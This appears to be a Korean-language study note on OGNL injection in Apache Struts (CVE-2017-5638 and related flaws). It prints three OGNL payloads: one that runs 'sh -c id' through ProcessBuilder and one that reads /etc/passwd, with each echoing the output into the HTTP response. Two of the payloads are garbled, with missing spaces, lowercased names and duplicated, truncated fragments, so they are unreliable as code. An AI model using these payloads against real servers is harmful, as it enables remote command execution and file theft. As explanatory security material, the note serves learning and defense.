## 📂**OGNL 표현식(주로 Apache Struts 계열의 OGNL 인젝션을 노린 페이로드)**  

서버에서 `sh -c id` 같은 OS 명령을 실행해 결과를 HTTP 응답으로 찍어내는 **원격 명령 실행(RCE)** 입니다. 

---

### Struts RCE 취약점

Struts에서 발생하는 RCE 취약점은 악의적인 사용자가 서버에 원격으로 코드를 실행할 수 있게 만드는 취약점입니다. 이는 주로 Struts의 파일 업로드, 폼 데이터 처리, OGNL(오브젝트 그래프 네이비게이션 언어) 표현식 평가 등의 기능을 악용하여 발생합니다.
이 취약점은 일반적으로 OGNL 평가(Object-Graph Navigation Language)와 관련이 있으며, OGNL을 통해 자바 객체를 조작하거나 외부 명령을 실행할 수 있는 상황을 만듭니다.

* Struts는 HTTP 요청에 포함된 데이터를 OGNL 표현식으로 평가합니다. OGNL은 자바 객체를 다룰 수 있는 강력한 도구이지만, 사용자가 악의적으로 설계한 표현식이 이를 악용하여 **원격 코드 실행(RCE)** 을 유발할 수 있습니다.
* 예를 들어, 공격자는 HTTP 요청에 악성 OGNL 표현식을 삽입하고 이를 Struts의 **Action** 클래스에서 처리하게 만들 수 있습니다. 이는 악성 코드를 서버에서 실행하도록 유도합니다.

### 💬 Struts RCE 취약점 사례

가장 잘 알려진 Struts RCE 취약점은 **CVE-2017-5638**입니다. 이 취약점은 Struts 2에서 **OGNL 평가와 관련된 취약점**으로, 악성 HTTP 요청을 통해 원격에서 명령을 실행할 수 있도록 허용했습니다.

* **CVE-2017-5638** (가장 유명한 취약점)
* **CVE-2018-11776** (OGNL 평가 관련 취약점)
* **CVE-2020-17530** (XSS 및 RCE 취약점)
* **CVE-2021-31805** (Struts 2.5.28에서의 원격 코드 실행 취약점)


---

## 1) ⏳

```
${(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter().println('RCE Successful'))}
```

위와 같은 표현식을 포함한 HTTP 요청을 보내면, 공격자가 지정한 명령(`'RCE Successful'`)이 **서버에서 실행**됩니다.
* 특정 환경에서는, 공격자는 파일 업로드를 통해 악성 페이로드를 업로드하고 이를 실행시키는 방법을 사용할 수도 있습니다. 예를 들어, **웹 쉘**을 업로드하고 이를 실행하는 방식입니다.


---

## 2) ⏳

```
redirect:${#a\=(newjava.lang.processbuilder(newjava.lang.string[]{'sh','-c','id'})).start(),#b\=#a.getinputstream(),#c\=newjava.io.inputstreamreader(#b),#d\=newjava.io.bufferedreader(#c),#e\=newchar[50000],#d.read(#e),#matt\=#context.get('com.opensymphony.xwork2.dispatcher.httpservletresponse'),#matt.getwriter().println(#e),#matt.getwriter().flush(),#matt.getwriter().close()},redirect:${,redirect:${#a\=(new java.,ProcessBuilder(newjava.lang.String[]{'sh','-c','id'})).start(),#b\=#a.getInputStream(),#c\=newjava.io.InputStreamRead
```

* `redirect:${...}` 안에 OGNL 표현식을 넣어, OGNL 평가 시 Java `ProcessBuilder` 인스턴스를 생성하고 `.start()`로 프로세스를 실행한다.
* 프로세스의 표준출력(InputStream)을 읽어 `ServletResponse`의 writer로 출력하여 HTTP 응답에 명령 결과(`id` 출력) 를 노출하려는 패턴.
* `new java.lang.ProcessBuilder(...).start()` → `getInputStream()` → `InputStreamReader` → `BufferedReader` → `read(char[])` → 써서 `response.getWriter().println(...)`.


### 문법(유효성)

* OGNL/Java 문법상 `new java.lang.ProcessBuilder(...)` 와 같이 공백·정확한 대소문자가 필요합니다.
* `getinputstream` vs `getInputStream`, `inputstreamreader` vs `InputStreamReader` 등 카멜케이스(띄어쓰기를 하지 않고 각 단어의 첫 글자를 대문자로 붙여 쓰되, 전체 단어의 첫 글자는 대문자 또는 소문자로 쓸 수 있는 방식)가 존재해서는 안 됩니다. 

---

## 3) ⏳

```
%{#a\=(newjava.lang.processbuilder(newjava.lang.string[]{"cat","/etc/passwd"})).redirecterrorstream(true).start(),#b\=#a.getinputstream(),#c\=newjava.io.inputstreamreader(#b),#d\=newjava.io.bufferedreader(#c),#e\=newchar[50000],#d.read(#e),#f\=#context.get("com.opensymphony.xwork2.dispatcher.httpservletresponse"),#f.getwriter().println(newjava.lang.string(#e)),#f.getwriter().flush(),#f.getwriter().close()},ProcessBuilder(newjava.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b\=#a.getInputStream(
```

* OGNL/Struts RCE 변형입니다. `cat /etc/passwd`를 실행해 시스템 파일을 노출시키려는 시도이며, `%{...}` 표기 역시 Struts에서 OGNL 표현식을 감쌀 때 종종 보이는 형식입니다.
